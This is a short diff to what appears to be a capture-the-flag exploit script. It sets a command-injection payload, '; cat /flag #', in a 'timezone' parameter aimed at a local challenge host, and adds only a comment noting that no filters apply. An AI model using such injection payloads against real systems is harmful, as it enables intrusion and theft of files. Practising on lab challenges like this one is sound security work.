@@ -4,6 +4,7 @@ method = "GET"
 site = "http://challenge.localhost"
 port = 80
 
+# No filters applied.
 payload = "; cat /flag #"
 params = {"timezone": payload}
 
